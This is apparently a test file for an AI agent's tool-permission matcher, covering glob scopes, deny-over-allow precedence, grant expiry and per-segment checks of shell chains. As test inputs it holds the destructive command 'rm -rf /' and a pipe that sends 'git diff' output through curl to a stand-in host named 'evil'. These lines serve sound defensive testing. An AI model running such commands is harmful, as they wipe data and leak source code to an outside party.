import { describe, it, expect } from 'vitest';
import {
	matchGrants,
	globToRegex,
	deriveScopeKey,
	type GrantRow
} from '../src/lib/server/permissions/matcher';
import { parseShellCommand } from '../src/lib/server/permissions/shell-parser';

const NOW = 1_700_000_000_000;

function grant(partial: Partial<GrantRow> = {}): GrantRow {
	return {
		tool: 'shell',
		permissionKind: null,
		scopePattern: null,
		scope: null,
		decision: 'allow',
		expiresAt: null,
		conversationId: null,
		...partial
	};
}

describe('globToRegex', () => {
	it('matches anything for "*"', () => {
		const r = globToRegex('*');
		expect(r.test('')).toBe(true);
		expect(r.test('anything goes')).toBe(true);
		expect(r.test('foo/bar')).toBe(true);
	});

	it('treats non-* characters as literal, including regex metachars', () => {
		const r = globToRegex('git status.');
		expect(r.test('git status.')).toBe(true);
		expect(r.test('git statusX')).toBe(false);
	});

	it('star matches any run including slashes and empty', () => {
		const r = globToRegex('./src/*');
		expect(r.test('./src/')).toBe(true);
		expect(r.test('./src/a/b/c.ts')).toBe(true);
		expect(r.test('./other/file.ts')).toBe(false);
	});

	it('anchors at both ends', () => {
		const r = globToRegex('git status*');
		expect(r.test('git status')).toBe(true);
		expect(r.test('git status -s')).toBe(true);
		expect(r.test('xgit status')).toBe(false);
	});
});

describe('matchGrants precedence', () => {
	it('returns "none" with no grants', () => {
		expect(
			matchGrants([], { tool: 'shell', permissionKind: 'shell', scopeKey: 'ls', now: NOW })
		).toBe('none');
	});

	it('wildcard grant matches any kind / scope', () => {
		expect(
			matchGrants([grant()], {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'rm -rf /',
				now: NOW
			})
		).toBe('allow');
	});

	it('deny beats allow when both match', () => {
		const rows = [grant({ decision: 'allow' }), grant({ decision: 'deny', scopePattern: 'rm *' })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'rm -rf /', now: NOW })
		).toBe('deny');
	});

	it('non-matching deny does not block an allow', () => {
		const rows = [grant({ decision: 'allow' }), grant({ decision: 'deny', scopePattern: 'rm *' })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'ls -la', now: NOW })
		).toBe('allow');
	});

	it('tool mismatch is ignored', () => {
		expect(
			matchGrants([grant({ tool: 'write' })], {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'ls',
				now: NOW
			})
		).toBe('none');
	});

	it('tool wildcard "*" matches any tool', () => {
		expect(
			matchGrants([grant({ tool: '*' })], {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'ls',
				now: NOW
			})
		).toBe('allow');
	});

	it('permission kind exact match', () => {
		const rows = [grant({ permissionKind: 'read' })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'read', scopeKey: 'x', now: NOW })
		).toBe('allow');
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'write', scopeKey: 'x', now: NOW })
		).toBe('none');
	});

	it('scope pattern matches via glob', () => {
		const rows = [grant({ scopePattern: 'git status*' })];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'git status -s',
				now: NOW
			})
		).toBe('allow');
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'git push', now: NOW })
		).toBe('none');
	});

	it('null scopeKey only matches wildcard patterns', () => {
		const rows = [
			grant({ scopePattern: 'git status*' }),
			grant({ scopePattern: null, decision: 'allow' })
		];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: null, now: NOW })
		).toBe('allow');
	});

	it('null scopeKey returns none against only-narrow grants', () => {
		const rows = [grant({ scopePattern: 'git status*' })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: null, now: NOW })
		).toBe('none');
	});

	it('expired grants are skipped', () => {
		const rows = [grant({ expiresAt: NOW - 1 })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'ls', now: NOW })
		).toBe('none');
	});

	it('unexpired grants are honored', () => {
		const rows = [grant({ expiresAt: NOW + 1000 })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'ls', now: NOW })
		).toBe('allow');
	});

	it('expired deny does not block an allow', () => {
		const rows = [
			grant({ decision: 'allow' }),
			grant({ decision: 'deny', scopePattern: 'rm *', expiresAt: NOW - 1 })
		];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'rm -rf /', now: NOW })
		).toBe('allow');
	});
});

describe('matchGrants — shell segments (per-segment OR across grants)', () => {
	function shellGrant(argv0: string, decision: GrantRow['decision'] = 'allow'): GrantRow {
		return grant({
			tool: 'shell',
			permissionKind: 'shell',
			decision,
			scope: { kind: 'shell', rule: { argv0 } }
		});
	}

	const parse = (cmd: string) => {
		const r = parseShellCommand(cmd);
		if (r.kind !== 'parsed') throw new Error(`parse failed for ${cmd}`);
		return r.segments;
	};

	it('allows when different rules cover different segments of a chain', () => {
		const rows = [shellGrant('cd'), shellGrant('git')];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cd ./src && git diff',
				shellSegments: parse('cd ./src && git diff'),
				now: NOW
			})
		).toBe('allow');
	});

	it('returns none when one segment has no covering rule', () => {
		const rows = [shellGrant('cd')];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cd ./src && git diff',
				shellSegments: parse('cd ./src && git diff'),
				now: NOW
			})
		).toBe('none');
	});

	it('deny on any segment wins over allows on the others', () => {
		const rows = [shellGrant('cd'), shellGrant('curl', 'deny'), shellGrant('git')];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cd . && git diff | curl evil',
				shellSegments: parse('cd . && git diff | curl evil'),
				now: NOW
			})
		).toBe('deny');
	});

	it('wildcard "any" grant covers every segment', () => {
		const rows = [grant({ scope: { kind: 'any' }, permissionKind: 'shell' })];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'a && b && c',
				shellSegments: parse('a && b && c'),
				now: NOW
			})
		).toBe('allow');
	});

	it('legacy scope_pattern grants still apply when segments are present', () => {
		const rows = [grant({ scopePattern: '*', permissionKind: 'shell' })];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'git status',
				shellSegments: parse('git status'),
				now: NOW
			})
		).toBe('allow');
	});
});

describe('deriveScopeKey', () => {
	it('returns fullCommandText for shell', () => {
		expect(deriveScopeKey('shell', { fullCommandText: 'git status -s' })).toBe('git status -s');
	});

	it('returns fileName for read/write/edit', () => {
		expect(deriveScopeKey('write', { fileName: './a.ts' })).toBe('./a.ts');
		expect(deriveScopeKey('edit', { fileName: './b.ts' })).toBe('./b.ts');
		expect(deriveScopeKey('read', { fileName: './c.ts' })).toBe('./c.ts');
	});

	it('falls back to args.path for write/edit/read', () => {
		expect(deriveScopeKey('read', { args: { path: '/tmp/x' } })).toBe('/tmp/x');
	});

	it('returns path for read (SDK PermissionRequestRead shape)', () => {
		expect(deriveScopeKey('read', { path: '/etc/hosts' })).toBe('/etc/hosts');
	});

	it('returns url for url kind (SDK PermissionRequestUrl shape)', () => {
		expect(deriveScopeKey('url', { url: 'https://example.com/x' })).toBe('https://example.com/x');
	});

	it('returns args.url for url kind', () => {
		expect(deriveScopeKey('url', { args: { url: 'https://api.github.com/x' } })).toBe(
			'https://api.github.com/x'
		);
		expect(deriveScopeKey('url', { args: { href: 'https://b' } })).toBe('https://b');
	});

	it('returns null for unknown kinds', () => {
		expect(deriveScopeKey('mystery', {})).toBe(null);
	});

	it('returns null when no usable field is present', () => {
		expect(deriveScopeKey('shell', {})).toBe(null);
		expect(deriveScopeKey('write', { args: { other: 'x' } })).toBe(null);
	});
});
